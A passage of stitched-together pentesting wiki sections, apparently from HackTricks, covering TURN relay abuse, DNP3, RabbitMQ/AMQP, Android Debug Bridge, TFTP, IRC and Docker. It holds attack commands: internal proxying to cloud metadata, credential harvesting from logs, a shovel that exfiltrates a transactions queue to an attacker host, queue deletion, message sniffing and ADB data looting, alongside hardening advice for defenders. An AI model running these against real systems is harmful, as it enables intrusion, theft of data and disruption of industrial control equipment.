text: ## Basic Information Web apps with voice or video calls, screen sharing or meetings use **WebRTC**. When two browsers cannot connect directly (NAT, firewalls), the media goes through a **TURN** server (Traversal Using Relays around NAT, usually on port `3478`). A TURN client authenticates, asks the server for an **allocation** (a relay address), authorizes a peer address (`CreatePermission` or `ChannelBind` for UDP), and then the server forwards traffic between the client and that peer.<sup>[[3]](#references)</sup> Over TCP (RFC 6062), the client sends a `Connect` request with the peer `ip:port` in `XOR-PEER-ADDRESS`, the server opens the TCP connection, and the client binds a second connection to it with `ConnectionBind`. If local policy forbids the peer, the server must answer `403 (Forbidden)`.<sup>[[2]](#references)</sup> This works like an open SOCKS proxy or a web proxy that accepts `CONNECT`.<sup>[[1]](#references)</sup> The peer address is chosen by the client. If the TURN server does not refuse private and special addresses, any user who has TURN credentials can use it as a **proxy into the network where the TURN server runs**: loopback services, RFC1918 ranges and link-local addresses such as the cloud metadata service `169.254.169.254`.<sup>[[3]](#references)</sup> This is an SSRF-like issue at the TCP/UDP level, and it is not limited to HTTP targets.<sup>[[1]](#references)</sup> OWASP ASVS 5.0 requires that the TURN service only allows peers outside special-purpose ranges (internal, broadcast, loopback), for both IPv4 and IPv6 (17.1.1), and that it resists resource exhaustion when legitimate users open many ports (17.1.2).<sup>[[4]](#references)</sup>

title: HT: Getting TURN credentials from the web app (3478-pentesting-turn)
text: ## Getting TURN credentials from the web app The browser receives the TURN configuration from the application before the call starts and passes it to `RTCPeerConnection` in `iceServers` (`urls`, `username`, `credential`):<sup>[[5]](#references)</sup> ```javascript new RTCPeerConnection({ iceServers: [{ urls: "turn:turn.example.com:3478?transport=tcp", username: "1716900000:user42", credential: "base64hmac==" }] }) ``` Many coturn deployments use the time-limited "TURN REST API" credentials: the username is `timestamp:userid` and the password is `base64(hmac(secret, username))`.<sup>[[6]](#references)</sup> They are short-lived, but every user who can start or join a call receives them. When anyone can register or join anonymous meetings, TURN authentication is not a real security boundary.<sup>[[3]](#references)</sup> To find them, join or start a call through Burp and search the HTTP history **and the WebSocket messages** for `3478`, `password`, `credential` and `username`. If TURN runs on a non-standard port, decode that traffic as `STUN` in Wireshark to see the username (the password cannot be recovered from the capture) and search Burp again for it.<sup>[[7]](#references)</sup>

title: HT: Testing with stunner (3478-pentesting-turn)
text: ## Testing with stunner [stunner](https://github.com/firefart/stunner) tests and abuses STUN/TURN servers. Most subcommands take `-s host:port`, `--tls`, `--protocol tcp|udp` (default `udp`), `-u` and `-p`.<sup>[[7]](#references)</sup> <details> <summary>stunner commands for TURN relay testing</summary> ```bash

title: HT: Built-in scanners over the relay (HTTP for TCP, SNMP/DNS for UDP) (3478-pentesting-turn)
text: # Built-in scanners over the relay (HTTP for TCP, SNMP/DNS for UDP) ./stunner tcp-scanner -s turn.example.com:3478 -u <username> -p <password> --ip 10.0.0.1/24 ./stunner udp-scanner -s turn.example.com:3478 -u <username> -p <password> --ip 10.0.0.1/24 --domain domain.you.control.com --community-string public ``` </details> The `socks` mode only relays TCP, and DNS names are resolved locally, so use IP literals for internal targets.<sup>[[7]](#references)</sup> Steps: 1. Get valid credentials from the app as a normal user and run `info`.<sup>[[7]](#references)</sup> 2. Run `range-scan` over TCP and UDP. Any allowed private or restricted range can then be enumerated with the scanners or the SOCKS proxy.<sup>[[7]](#references)</sup> 3. Start `socks` and send a harmless request, for example `curl --socks5 127.0.0.1:1080 http://169.254.169.254/latest/meta-data/` or an HTTP request to a loopback port such as `https://127.0.0.1:8443`. A relayed response shows that the server is vulnerable. A `403` on `Connect` / `CreatePermission` is the expected refusal.<sup>[[2]](#references)[[7]](#references)</sup> 4. If the plain addresses are blocked, retry with **alternate encodings of the same destination**. Peer filters in coturn were bypassed with `0.0.0.0`, `[::]` and `[::1]` (the first two reach the local host on Linux), and with IPv4-mapped IPv6 such as `[::ffff:127.0.0.1]` or `[::ffff:169.254.169.254]`, which skipped IPv4 `denied-peer-ip` ranges.<sup>[[9]](#references)[[10]](#references)[[11]](#references)</sup> If the TURN host has a NAT64 route, IPv6 forms that embed an IPv4 address (such as the `64:ff9b::/96` prefix) can also bypass IPv4-only deny rules.<sup>[[12]](#references)</sup> Test both the UDP permission path (`CreatePermission` / `ChannelBind`) and the TCP `Connect` pa

title: HT: Hardening (coturn) (3478-pentesting-turn)
text: ## Hardening (coturn) Current coturn denies loopback peers unless `allow-loopback-peers` is set (meant only for testing), and `no-multicast-peers` blocks multicast peers.<sup>[[6]](#references)</sup> Other private and special ranges must be denied explicitly. Because of the encoding bypasses above, also deny `0.0.0.0/8` and the IPv4-mapped range `::ffff:0:0/96` even on patched versions (for example CVE-2020-26262 and CVE-2026-27624 were bypasses of this kind):<sup>[[3]](#references)[[8]](#references)</sup> ``` no-multicast-peers denied-peer-ip=0.0.0.0-0.255.255.255 denied-peer-ip=10.0.0.0-10.255.255.255 denied-peer-ip=127.0.0.0-127.255.255.255 denied-peer-ip=169.254.0.0-169.254.255.255 denied-peer-ip=172.16.0.0-172.31.255.255 denied-peer-ip=192.168.0.0-192.168.255.255 denied-peer-ip=::ffff:0.0.0.0-::ffff:255.255.255.255 denied-peer-ip=64:ff9b::-64:ff9b::ffff:ffff denied-peer-ip=fc00::-fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff denied-peer-ip=fe80::-febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff user-quota=100 total-quota=10000 ``` `user-quota` and `total-quota` default to `0`, which means no limit. If TCP relaying is not needed, `no-tcp-relay` disables it. If an address is both allowed and denied, it is allowed, so review `allowed-peer-ip` entries too.<sup>[[6]](#references)</sup> An `allowed-peer-ip` list does not deny everything else by itself, so allowlist-only setups still need a deny-all rule.<sup>[[8]](#references)</sup> Denial of service against WebRTC media servers is covered in [WebRTC DoS](../generic-methodologies-and-resources/pentesting-network/webrtc-dos.md). For other SSRF vectors, see [SSRF](../pentesting-web/ssrf-server-side-request-forgery/).

title: HT: 20000 - Pentesting DNP3 (20000-pentesting-dnp3)
text: # 20000 - Pentesting DNP3 {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (20000-pentesting-dnp3)
text: ## Basic Information For process-safety prerequisites before active OT testing, see [Industrial Control Systems / OT](../industrial-control-systems/README.md#assessment-priorities). **DNP3 (Distributed Network Protocol 3, standardized as IEEE 1815)** is the SCADA protocol that dominates **North American** electric utilities, and is widely used in **water/wastewater and oil & gas**. A **master** station polls **outstations** (RTUs/IEDs) for telemetry and issues control commands; outstations can also push **unsolicited responses** on their own. On plaintext **TCP/20000** it carries **no authentication and no encryption** by default, so any host that reaches the port can read the outstation's points and, where nothing else blocks it, operate its outputs.<sup>[[3]](#references)</sup> **Default DNP3 port:** 20000 (TCP and UDP). The same application layer also runs over **serial** (RS-232/RS-485), which is what you meet behind terminal servers and radio links. Optional **DNP3-over-TLS** wraps the TCP session, but fielded adoption is very limited; most links are in the clear.<sup>[[1]](#references)[[3]](#references)</sup> ```text PORT STATE SERVICE 20000/tcp open dnp ``` DNP3 uses a compact three-layer stack (the "EPA" model) rather than a full OSI stack:<sup>[[1]](#references)[[4]](#references)</sup> - **Data Link Layer**: FT3 framing. Every frame starts with the sync bytes `0x0564`, carries a **16-bit source and destination link address** (0–65519; `0xFFFF` is broadcast, `0xFFFC` self-address), and protects each 16-byte block with its own CRC. This is the layer a range scan walks. - **Transport (pseudo) Layer**: a 1-byte header that fragments/reassembles application messages (≤250 bytes per segment). - **Application Layer**: the **function codes** and **objects** that actual

title: HT: Enumeration (20000-pentesting-dnp3)
text: ## Enumeration ### Automatic ```bash nmap -p 20000 --open -sV <IP> # service detection; DNP3 has no text banner ``` Nmap's version probe recognizes a DNP3 outstation on 20000, but note the **official Nmap distribution ships no DNP3 NSE script** (unlike `modbus-discover`, `s7-info`, `enip-info` or `iec61850-mms`), so there is no scripted identity/point dump — that part is OIDA's or a manual job below.<sup>[[2]](#references)</sup> ### Passive Recon Plaintext DNP3 means a capture usually hands you the master/outstation pair, the point map, and any control activity before you send anything. Useful Wireshark display filters:<sup>[[4]](#references)</sup> ```bash dnp3 # all DNP3 dnp3.al.func == 1 # Read dnp3.al.func == 2 # Write dnp3.al.func == 5 # Direct Operate (control, no select) dnp3.al.func == 3 || dnp3.al.func == 4 # Select / Operate (SBO control pair) dnp3.al.func == 130 # Unsolicited Response (0x82, outstation-initiated) dnp3.ctl.prifunc == 9 # data-link Request Link Status (discovery) dnp3.src == 1 && dnp3.dst == 1024 # follow one master<->outstation link-address pair ``` `oida` parses a capture into per-session views: it pairs each **DNP3 master (SCADA)** with the **outstation (RTU/IED)** it talks to, lists the function codes and object groups seen, decodes point values and the IIN flags, and separates monitor traffic from **control/write** operations:<sup>[[2]](#references)</sup> ```bash oida pcap capture.pcap --protocols dnp3 # DNP3-only passive analysis oida pcap capture.pcap --protocols modbus,dnp3 # several ICS protocols at once ``` Because the link-layer source/destination addresses travel in the clear, one capture gives you the valid **master address** and **outstation address** to impersonate later; the passive view also flags **bad-CRC frames**, which on a

text: # A live outstation replies LINK_STATUS (FC 0x0B). ``` For scripted interaction the reference open-source stack is **opendnp3** (what `yadnp3`/OIDA build on); it implements the full master and outstation state machines, so you can reproduce selects/operates, file transfer and SAv5 by hand for odd points or control models the tools don't expose cleanly.<sup>[[5]](#references)</sup>

title: HT: Function Codes and Control Semantics (20000-pentesting-dnp3)
text: ## Function Codes and Control Semantics The application function code is one byte. The security-relevant ones:<sup>[[4]](#references)</sup> | FC | Name | FC | Name | |----|------|----|------| | 0x01 | Read | 0x0D / 0x0E | Cold / Warm Restart | | 0x02 | Write | 0x0F / 0x10 | Initialize Data / Application | | 0x03 | **Select** | 0x11 / 0x12 | Start / Stop Application | | 0x04 | **Operate** | 0x13 | Save Configuration | | 0x05 | **Direct Operate** | 0x14 / 0x15 | Enable / Disable Unsolicited | | 0x06 | Direct Operate, No Ack | 0x16 | Assign Class | | 0x07–0x0C | Freeze (immediate / clear / at-time, ±ack) | 0x18 | Record Current Time | | 0x81 | Response | 0x82 | **Unsolicited Response** | Three semantics decide whether a command actually moves process state: - **Control has two models.** **Direct Operate** (`0x05`) is a single message that acts immediately. **Select-Before-Operate (SBO)** is a `Select` (`0x03`) followed by an `Operate` (`0x04`): the outstation "arms" the point on Select and only actuates if a matching Operate arrives inside a short timeout. Many relays accept **only** SBO, so a lone Direct Operate silently does nothing — check which model the point honors before concluding an output is not writable. - **Unsolicited responses** (`0x82`) are outstation-initiated reports. A master that does not validate their origin will absorb **forged unsolicited responses** from any IP as genuine telemetry (false data injection); conversely `Disable Unsolicited` (`0x15`) lets an attacker mute alarm reporting to the legitimate master. - **Secure Authentication (SAv5, Group 120)** adds an HMAC challenge/response (and aggressive-mode MAC) on critical requests. Without it — the common case — any `Operate`, `Write`, `Freeze`, restart or `Disable Unsolicited` is **forgeable by an

title: HT: What Usually Leads to Impact (20000-pentesting-dnp3)
text: ## What Usually Leads to Impact In real assessments the path to impact is almost never memory corruption; it is the protocol trusting whoever reaches the port:<sup>[[1]](#references)[[3]](#references)</sup> - **Unauthenticated read** of the full point map (Class 0 integrity poll) plus device identity (Group 0) and often **File-transfer (Group 70)** config/log pulls — all without credentials. - **Unauthenticated control** where SAv5 is not enforced: a `Direct Operate`/`Operate` CROB with `TRIP`/`CLOSE` on a Binary Output, or an Analog Output setpoint write, is a **physical control action** — opening a breaker, moving a setpoint, starting/stopping a pump. - **No origin validation**: forged **unsolicited responses** inject false readings into the master, and a a forged **time-sync** (`--time-sync`, a clock write) shifts outstation timestamps to build a self-consistent fake event timeline. - **No replay or integrity protection**: captured DNP3 can be replayed, and because the CRC is attacker-recomputable, on-path frames can be modified in flight where TLS/SAv5 are absent. - **Vendor-extension object groups (80–127)** are a frequently ungated surface: non-error responses to groups outside the documented set can expose firmware-download, debug or setpoint channels that bypass standard DPI rules written for groups 1–79. - **Availability primitives are first-class function codes**: `Stop Application`, `Cold/Warm Restart` and no-ack `Freeze and Clear` disrupt or reset an outstation with a single authorized-looking message. MITRE ATT&CK for ICS files the resulting control writes as **Unauthorized Command Message → Command Message (T1692.001)** (the ID that superseded the revoked `T0855`), and the restart/stop abuse as **Denial of Service (T0814)**.<sup>[[6]](#references)[[7]](#re

title: HT: 5671,5672 - Pentesting AMQP (5671-5672-pentesting-amqp)
text: # 5671,5672 - Pentesting AMQP {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (5671-5672-pentesting-amqp)
text: ## Basic Information **RabbitMQ** is a message and streaming broker. Producers publish messages to exchanges, exchanges route them to queues or streams, and consumers receive them. RabbitMQ supports AMQP 0-9-1 and, since RabbitMQ 4.0, native AMQP 1.0 on the same listeners, plus optional protocol plugins.<sup>[[1]](#references)[[11]](#references)</sup> **Default ports:** 5672 for plain AMQP and 5671 for AMQP over TLS.<sup>[[2]](#references)</sup> ``` PORT STATE SERVICE VERSION 5672/tcp open amqp RabbitMQ 3.1.5 (0-9) ``` - **Default credentials**: `guest:guest`. RabbitMQ restricts them to localhost through `loopback_users`, but many Docker/IoT images disable that check, so always test remote login before assuming it is blocked. - **Authentication mechanisms**: PLAIN and AMQPLAIN are enabled by default, ANONYMOUS is mapped to `anonymous_login_user`/`anonymous_login_pass`, and EXTERNAL (x509) can be exposed when TLS is enabled. Enumerate what the broker advertises so you know whether to try password spraying or certificate impersonation later.<sup>[[3]](#references)</sup> - **AMQP 1.0 on the same listener**: RabbitMQ 4.x exposes native AMQP 1.0 on `5672/5671`. Targeting `/queues/<queue>` sends to an existing queue through the internal `amq.default` exchange; the user still needs write permission on `amq.default`, and the queue must exist.<sup>[[11]](#references)</sup>

title: HT: Enumeration (5671-5672-pentesting-amqp)
text: ## Enumeration ### Manual ```python import amqp

title: HT: By default it uses "guest":"guest" (5671-5672-pentesting-amqp)
text: # By default it uses "guest":"guest" conn = amqp.connection.Connection(host="IP", port=5672, virtual_host="/") conn.connect() print("SASL mechanisms:", conn.mechanisms) for k, v in conn.server_properties.items(): print(k, v) ``` Once authenticated, dump `conn.server_properties`, `conn.channel_max` and `conn.frame_max` to understand throughput limits and whether you can exhaust resources with oversized frames. Starting with RabbitMQ **4.3.1**, **passive** `queue.declare` / `exchange.declare` calls require at least one matching permission (`configure`, `write`, or `read`) on the target object. They do not create topology, and differences between `NOT_FOUND` and `ACCESS_REFUSED` can help distinguish nonexistent names from names outside the account's permission regex.<sup>[[12]](#references)</sup> ### Automatic ```bash nmap -sV -Pn -n -T4 -p 5672 --script amqp-info IP PORT STATE SERVICE VERSION 5672/tcp open amqp RabbitMQ 3.1.5 (0-9) | amqp-info: | capabilities: | publisher_confirms: YES | exchange_exchange_bindings: YES | basic.nack: YES | consumer_cancel_notify: YES | copyright: Copyright (C) 2007-2013 GoPivotal, Inc. | information: Licensed under the MPL. See http://www.rabbitmq.com/ | platform: Erlang/OTP | product: RabbitMQ | version: 3.1.5 | mechanisms: PLAIN AMQPLAIN |_ locales: en_US ``` ### TLS/SASL checks - **Probe AMQPS**: ```bash openssl s_client -alpn amqp -connect IP:5671 -tls1_3 -msg </dev/null ``` This leaks the certificate chain, supported TLS versions and whether mutual TLS is required. - **List listeners** without creds: ```bash rabbitmq-diagnostics -q listeners ``` Useful once you get low-priv shell access to the host. - **Spot ANONYMOUS logins**: if the broker allows the ANONYMOUS SASL mechanism, try connecting with an empty username/password; RabbitMQ

title: HT: Exploitation Tips (5671-5672-pentesting-amqp)
text: ## Exploitation Tips ### Queue deletion without configure perms (CVE-2024-51988) Open-source RabbitMQ versions **after 3.12.7 and before 3.12.11** fail to check the `configure` permission when queues are deleted through the HTTP API. An authenticated user with some permission on the target vhost and HTTP API access can delete queues for which it lacks deletion permission. RabbitMQ 3.12.11 fixes the issue; Tanzu version ranges differ, so consult the advisory.<sup>[[4]](#references)</sup> ```bash

title: HT: confirm vulnerable version first (5671-5672-pentesting-amqp)
text: # confirm vulnerable version first rabbitmqadmin -H target -P 15672 -u user -p pass show overview | grep -i version

title: HT: delete a high-value queue (5671-5672-pentesting-amqp)
text: # delete a high-value queue curl -k -u user:pass -X DELETE https://target:15672/api/queues/%2F/payments-processing ``` Combine this with `rabbitmqadmin list permissions` to find vhosts where your low-priv user has partial access, then wipe queues to induce denial of service or trigger compensating controls observed on the AMQP side. Check [15672 pentesting](15672-pentesting-rabbitmq-management.md) for more HTTP API endpoints to chain with this bug. ### Harvest credentials from RabbitMQ logs (CVE-2025-50200) RabbitMQ **3.13.0–3.13.7** and **4.0.0–4.0.7** can log the complete HTTP Basic `Authorization` header when a management API request raises certain errors, such as a lookup for a nonexistent queue. Patched versions are 3.13.8 and 4.0.8. If you gain authorized filesystem access, search the RabbitMQ logs for leaked credentials belonging to users whose requests triggered the affected error path.<sup>[[5]](#references)</sup> ```bash curl -k -u pentester:SuperSecret https://target:15672/api/queues/%2f/ghost sudo grep -R "Authorization:" /var/log/rabbitmq | cut -d' ' -f3 | base64 -d ``` Correlate any decoded value with its timestamp and request context, then test reuse only within scope over AMQP, STOMP, MQTT, or the management API. Avoid deliberately submitting third-party credentials to the vulnerable endpoint because that creates another plaintext copy in the logs. ### Weaponize rabbitmqadmin-ng `rabbitmqadmin` v2 (aka rabbitmqadmin-ng) is a self-contained CLI that talks to the management API and now ships statically linked builds for Linux/macOS/Windows. Drop it on your bounce box and script:<sup>[[6]](#references)</sup> ```bash

title: HT: enumerate live channels and prefetch pressure (5671-5672-pentesting-amqp)
text: # enumerate live channels and prefetch pressure rabbitmqadmin --host target --port 15672 --username user --password pass channels list --non-interactive

title: HT: clone a shovel to exfiltrate messages to attacker-controlled broker (5671-5672-pentesting-amqp)
text: # clone a shovel to exfiltrate messages to attacker-controlled broker rabbitmqadmin shovels declare_amqp091 \ --name loot \ --source-uri amqp://user:pass@target:5672/%2f \ --destination-uri amqp://attacker:pw@vps:5672/%2f \ --source-queue transactions \ --destination-queue stolen ``` The tool's health checks can also ask the management API whether a node listens on a given port, for example `rabbitmqadmin health_check port_listener --port 5672`. This reports listener presence; it does not by itself prove that the listener is plaintext, TLS-enabled, or externally reachable. ### Message hijacking/sniffing If permissions allow broad bindings to topic exchanges, you can copy matching messages into a temporary queue without consuming them from the original queue. Creating the queue requires `configure`, binding it requires `write` on the exchange and `read` on the queue, and consuming requires `read` on the queue.<sup>[[3]](#references)</sup> ```python import pika creds = pika.PlainCredentials('user','pass') conn = pika.BlockingConnection(pika.ConnectionParameters('IP', 5672, '/', creds)) ch = conn.channel() ch.queue_declare(queue='loot', exclusive=True, auto_delete=True) ch.queue_bind(queue='loot', exchange='amq.topic', routing_key='#') for method, props, body in ch.consume('loot', inactivity_timeout=5): if body: print(method.routing_key, body) ``` Swap the routing key for `audit.#` or `payments.*` to focus on sensitive flows, then republish forged messages by flipping `basic_publish` arguments—handy for replay attacks against downstream microservices. title: HT: 5555 - Android Debug Bridge (5555-android-debug-bridge)
text: # 5555 - Android Debug Bridge {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (5555-android-debug-bridge)
text: ## Basic Information From [the docs](https://developer.android.com/studio/command-line/adb):<sup>[[1]](#references)</sup> Android Debug Bridge (adb) is a command-line tool to communicate with Android-based devices and emulators. Typical actions include installing packages, debugging, and getting an interactive Unix shell on the device.<sup>[[1]](#references)</sup> - Historical default TCP port: 5555 (classic "adb tcpip" mode). - Modern Wireless debugging (Android 11+) uses TLS pairing and mDNS service discovery. The connect port is dynamic and discovered via mDNS; it may not be 5555. Pairing is done with adb pair host:port followed by adb connect. See the notes below for offensive implications.<sup>[[2]](#references)</sup> Example nmap fingerprint: ``` PORT STATE SERVICE VERSION 5555/tcp open adb Android Debug Bridge device (name: msm8909; model: N3; device: msm8909) ```

title: HT: Connect (5555-android-debug-bridge)
text: ## Connect If you find ADB exposed and reachable, try connecting and enumerating quickly: ```bash adb connect <ip>[:<port>] # Default is 5555 for classic mode adb devices -l # Confirm it shows as "device" (not unauthorized/offline) adb shell # Get an interactive shell (uid usually shell) whoami; id; getprop ro.debuggable ro.secure service.adb.tcp.port adb root || true # Works on eng/userdebug/insecure builds, many emulators/IoT ``` - If the device enforces ADB authentication (ro.adb.secure=1), you’ll need to be pre-authorized (USB RSA auth) or use Android 11+ Wireless debugging pairing (which requires a one-time code displayed on the device). - Some vendor images, engineering/userdebug builds, emulators, TVs, STBs and development kits expose adbd without auth or with adbd running as root. In those cases, you’ll typically land directly in a shell or root shell. For a general ADB command reference, see: {{#ref}} ../mobile-pentesting/android-app-pentesting/adb-commands.md {{#endref}}

title: HT: Quick Post-Exploitation (5555-android-debug-bridge)
text: ## Quick Post-Exploitation Once you have shell, validate privileges and SELinux context: ```bash id; getenforce; getprop ro.build.type ro.product.model ro.build.fingerprint ``` ### Enumerate and capture data - List third-party apps and paths: ```bash pm list packages -3 pm path <pkg> ``` - If you have root (adb root or su works), you can access /data directly. If not, prefer run-as for debuggable apps: ```bash # Without root, for a debuggable app run-as <pkg> sh -c 'cd /data/data/<pkg> && tar cf - .' | tar xf - -C ./loot/<pkg> # With root cp -a /data/data/<pkg> /sdcard/<pkg> exit adb pull "/sdcard/<pkg>" ``` - Useful system artifacts (root required): - /data/system/users/0/accounts.db and related AccountManager data - /data/misc/wifi/ (network configs/keys on older versions) - App-specific SQLite DBs and shared_prefs under /data/data/<pkg> You can use this to retrieve sensitive info (e.g., app secrets). For notes about Chrome data considerations, see the issue referenced [here](https://github.com/carlospolop/hacktricks/issues/274). ### Code execution and payload delivery - Install and auto-grant runtime permissions: ```bash adb install -r -g payload.apk # -g grants all runtime perms declared in manifest adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1 ``` - Start activities/services/broadcasts directly: ```bash adb shell am start -n <pkg>/<activity> adb shell am startservice -n <pkg>/<service> adb shell am broadcast -a <action> ``` ### Port forwarding and pivoting Even without root, adb can forward local ports to device ports and vice versa. This is useful to access services bound locally on the device or to expose attacker services to the device. - Forward host->device (access a device-local service from your host): ```bash adb forward tcp:2222 tcp:22 #

title: HT: Wireless Debugging (Android 11+) (5555-android-debug-bridge)
text: ## Wireless Debugging (Android 11+) Modern Android implements TLS-protected wireless debugging with device-side pairing and mDNS discovery:<sup>[[2]](#references)</sup> ```bash

title: HT: On the device: Developer options -> Wireless debugging -> Pair device with pairing code (5555-android-debug-bridge)
text: # On the device: Developer options -> Wireless debugging -> Pair device with pairing code

title: HT: On attacker host (same L2 network, mDNS allowed): (5555-android-debug-bridge)
text: # On attacker host (same L2 network, mDNS allowed): adb pair <device_ip>:<pair_port> # Enter the 6-digit code shown on device adb mdns services # Discover _adb-tls-connect._tcp / _adb._tcp services adb connect <device_ip>:<conn_port> ``` Notes - Ports are dynamic; don’t assume 5555. mDNS service names look like: - _adb-tls-pairing._tcp (pairing) - _adb-tls-connect._tcp (paired connect) - _adb._tcp (legacy/plain) - If mDNS is filtered, classic USB-assisted enabling may still work on some builds: `adb tcpip 5555` then `adb connect <ip>:5555` (until reboot). Offensive implications: if you can interact with the device UI (e.g., physical access or mobile MDM misconfig) to enable Wireless debugging and view the pairing code, you can establish a long-lived paired ADB channel without a cable. Some OEMs expose ADB over TCP in engineering/dev images without pairing—always check.

title: HT: ADB scanning and worm-like propagation (5555-android-debug-bridge)
text: ## ADB scanning and worm-like propagation An implant already running on Android can implement the ADB wire protocol itself and use the infected device as a propagation node. One documented chain accepted an operator-supplied `IP:port` or discovered `_adb._tcp`, `_adb-tls-connect._tcp`, and `_adb-tls-pairing._tcp` through mDNS; its remote-scan mode expanded an address to a `/16`, performed a fast TCP-connect pass, and then sent an ADB `CNXN` probe to the responsive endpoints. Candidates replying with `AUTH` or `CNXN` were handed to a raw client supporting authentication, TLS negotiation, stream open/write/close, and shell services.<sup>[[5]](#references)</sup> The observed probe below advertises the `host::` banner. It can be replayed during an authorized assessment to distinguish an ADB-speaking socket from an unrelated service; inspect the first four response bytes for `AUTH` or `CNXN`.<sup>[[5]](#references)</sup> ```bash probe=434e584e01000001000010000600000032020000bcb1a7b1686f73743a3a printf '%s' "$probe" | xxd -r -p | nc -w 1 <target> <port> | xxd -g1 ``` A protocol response is **not** equivalent to compromise. Propagation still requires a reachable endpoint plus disabled authentication, an already trusted attacker-controlled ADB key, or successful Wireless-debugging pairing. The resulting privilege is a separate boundary: a normal `shell` context is limited by Android permissions and SELinux, whereas root or working `su` can additionally grant protected permissions, enable an Accessibility service, change ADB properties, or place an APK under a system-app path.<sup>[[5]](#references)</sup> During incident response, use an already authorized connection to correlate the ADB configuration with unexpected packages, Accessibility services, listeners, and trusted keys:

title: HT: Hardening / Detection (5555-android-debug-bridge)
text: ## Hardening / Detection Defenders should assume any reachable adbd (TCP) is critical risk. - Disable ADB and Wireless debugging when not needed. Revoke USB debugging authorizations in Developer options. - Ensure network policy blocks inbound TCP/5555 and mDNS-based ADB discovery on untrusted segments. - On devices under your control: ```bash settings put global adb_enabled 0 setprop service.adb.tcp.port -1 # disable TCP listening (or use: adb usb) stop adbd; start adbd # restart daemon ``` - Monitor for mDNS records `_adb._tcp`, `_adb-tls-connect._tcp`, `_adb-tls-pairing._tcp` on corporate networks and alerts for unexpected 5555 listeners. - Alert when one Android/container source fans out to many hosts on the same candidate ADB port, especially when connections begin with the `CNXN` probe shown above; this joins discovery, scanning, and protocol confirmation into a higher-confidence signal than any one event alone.<sup>[[5]](#references)</sup> - Inventory for insecure builds: `getprop ro.debuggable`, `ro.build.type`, and `ro.adb.secure`.

title: HT: 69 - UDP TFTP (69-udp-tftp)
text: # 69 - UDP TFTP {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (69-udp-tftp)
text: ## Basic Information **Trivial File Transfer Protocol (TFTP)** is a small UDP-based file-transfer protocol. A client sends its initial read or write request to UDP port 69, after which the transfer uses negotiated transfer identifiers (UDP ports). TFTP provides neither user authentication nor directory listing, so server-side file permissions and path restrictions are its primary access controls.<sup>[[1]](#references)</sup> TFTP is still commonly encountered on internal networks for bootstrapping devices—including VoIP handsets—and transferring firmware, ROM images, or configuration files. Those files can reveal credentials and network topology, so test both readable and writable paths within the authorized scope.<sup>[[1]](#references)</sup> **Default Port:** 69/UDP ``` PORT STATE SERVICE REASON 69/udp open tftp script-set ```

title: HT: Enumeration (69-udp-tftp)
text: ## Enumeration Because TFTP does not provide directory listings, Nmap's `tftp-enum` script requests names from a list of common files. It is categorized as intrusive; use it only against systems you are authorized to test.<sup>[[2]](#references)</sup> ```bash nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> ``` The NSE script also generates Cisco-style `A.B.C.X-confg` candidates from the target address. Supply a target-specific list built from observed boot filenames, device models and provisioning conventions instead of relying only on its generic list.<sup>[[2]](#references)</sup> ```bash nmap -n -Pn -sU -p69 --script tftp-enum \ --script-args tftp-enum.filelist=./tftp-files.txt <IP> ``` TFTP error packets distinguish conditions such as **file not found** (code 1), **access violation** (2), **file already exists** (6) and an **unknown transfer ID** (5). Treat the exact mapping as implementation-specific, but preserve responses while enumerating because a policy rejection is more informative than a timeout.<sup>[[1]](#references)</sup> The server's first response comes from a new UDP source port, not necessarily 69. If a scanner finds port 69 but transfers time out, capture all UDP traffic to the host and check whether a firewall/NAT is dropping the negotiated flow.<sup>[[1]](#references)[[3]](#references)</sup> ```bash sudo tcpdump -ni any "udp and host <IP>" ``` ### Download/Upload Use Metasploit's transfer utility or a TFTP client to test explicitly authorized reads and writes. Uploads succeed only when the server permits writing to the requested location.<sup>[[1]](#references)[[3]](#references)</sup> ```text msfconsole -q use auxiliary/admin/tftp/tftp_transfer_util set ACTION Download set RHOST <IP> set REMOTE_FILENAME <remote-file> run ``` A native client is usef

title: HT: 194,6667,6660-7000 - Pentesting IRC (pentesting-irc)
text: # 194,6667,6660-7000 - Pentesting IRC {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (pentesting-irc)
text: ## Basic Information IRC is a text protocol. IANA assigns TCP 194 to IRC, while deployments have historically used TCP 6667 and adjacent unprivileged ports; modern networks also commonly offer TLS on 6697.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup> Registration normally requires at least `NICK` and `USER`; a server may additionally require `PASS`, SASL, or other network-specific authentication. Reverse-DNS lookup is implementation/configuration dependent.<sup>[[2]](#references)</sup> Users are divided into **operators**, who need a **username** and **password** for more access, and regular **users**. Operators have varying levels of privileges, with administrators at the top. **Default ports:** 194, 6667, 6660-7000 ``` PORT STATE SERVICE 6667/tcp open irc ```

title: HT: Enumeration (pentesting-irc)
text: ## Enumeration ### Banner IRC can support **TLS**. ```bash nc -vn <IP> <PORT> openssl s_client -connect <IP>:<PORT> -quiet ``` ### Manual The following raw session registers a random nickname and exercises useful enumeration commands. title: HT: 2375, 2376 Pentesting Docker (2375-pentesting-docker)
text: # 2375, 2376 Pentesting Docker {{#include ../banners/hacktricks-training.md}} ### Docker Basics #### What it is Docker is a platform for building, distributing, and running applications in containers. The Docker Engine exposes a versioned REST API used by its command-line client and SDKs.<sup>[[8]](#references)</sup> #### Basic docker architecture - [**containerd**](https://containerd.io): A container runtime that manages image transfer and storage, snapshots, container execution, and supervision. - The **container-shim** plays a critical role as an **intermediary** in the handling of **headless containers**, seamlessly taking over from **runc** after the containers are initialized. - [**runc**](http://runc.io): Esteemed for its **lightweight and universal container runtime** capabilities, runc is aligned with the **OCI standard**. It is used by containerd to **start and manage containers** according to the **OCI guidelines**, having evolved from the original **libcontainer**. - [**grpc**](http://www.grpc.io) is essential for **facilitating communication** between containerd and the **docker-engine**, ensuring **efficient interaction**. - The [**OCI**](https://www.opencontainers.org) is pivotal in maintaining the **OCI specifications** for runtime and images, with the latest Docker versions being **compliant with both the OCI image and runtime** standards. #### Basic commands ```bash docker version #Get version of docker client, API, engine, containerd, runc, docker-init docker info # Get more information about Docker settings docker pull registry:5000/alpine #Download the image docker inspect <containerid> # Get information about the container docker network ls #List network info docker exec -it <containerid> /bin/sh #Get shell 